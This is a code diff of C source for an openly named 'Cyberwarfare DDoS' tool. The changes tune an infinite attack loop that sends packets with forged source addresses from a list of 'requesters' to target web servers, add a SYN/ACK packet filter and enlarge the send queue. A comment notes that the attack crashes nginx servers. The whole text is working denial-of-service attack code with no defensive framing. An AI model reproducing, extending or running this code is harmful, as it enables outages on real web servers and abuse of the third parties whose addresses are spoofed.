@@ -77,7 +77,7 @@ nginx seems to perform some socket action which kills the  webserver completely 
 due to the way it functions w the tcp/ip stack.. it happens before the page is returned.. and it shows as a 500 error in the error log
 
 
-apache doesnt seem to deal w that bug the same
+apache doesnt seem to deal w that bug the same.. maybe its not a bug as much as just the configuration.. anywaays it seems to work as fast as the web server can process
 
 */
 
@@ -344,6 +344,10 @@ int Cyberwarefare_DDoS_Init(AS_context *ctx) {
     // empty filter.. we want everything.
     FilterPrepare(flt, 0, 0);
 
+    // lets specify SYN/ACK for filter..
+    flt->flags |= FILTER_PACKET_FLAGS;
+    flt->packet_flags |= TCP_FLAG_SYN|TCP_FLAG_ACK;
+
     // clear other hooks
     ctx->IncomingPacketFunctions = NULL;
 
@@ -374,6 +378,8 @@ int Cyberwarfare_SendAttack1(AS_context *ctx, uint32_t src, uint32_t dst, int ts
         bptr->header_identifier = rand()%0xffffffff;
 
         NetworkQueueInstructions(ctx, bptr, optr);
+
+        //if (optr) OutgoingQueueLink(ctx, optr);
 
         PacketBuildInstructionsFree(&bptr);
         return 1;
@@ -473,18 +479,20 @@ void start_attack(AS_context *ctx) {
     OutgoingPacketQueue *optr = NULL;
     int fast = 1;
     int skip = 0;
+    int out_count = 0;
 
     while (1) {
         ts = time(0);
         if (!skip) {
             for (web_i = 0; web_i < webservers->v4_count; web_i++) {
                 for (req_i = 0; req_i < requesters->v4_count; req_i++) {
-                    Cyberwarfare_SendAttack1(ctx, requesters->v4_addresses[req_i], webservers->v4_addresses[web_i], ts, &optr);
-                    if (fast) {
+                    out_count += Cyberwarfare_SendAttack1(ctx, requesters->v4_addresses[req_i], webservers->v4_addresses[web_i], ts, &optr);
+                    if (fast) {//} && out_count++ > 100) {
                         OutgoingQueueLink(ctx, optr);
                         AS_perform(ctx);
                         network_process_incoming_buffer(ctx);
                         optr = NULL;
+                        //out_count = 0;
                     }
                 }
             }
@@ -535,6 +543,8 @@ int main(int argc, char *argv[]) {
     }
 
     ctx->http_discovery_enabled = 0;
+
+    ctx->queue_buffer_size = 1024*100;
 
 
     Module_Add(ctx, &Cyberwarefare_DDoS_Init, NULL);
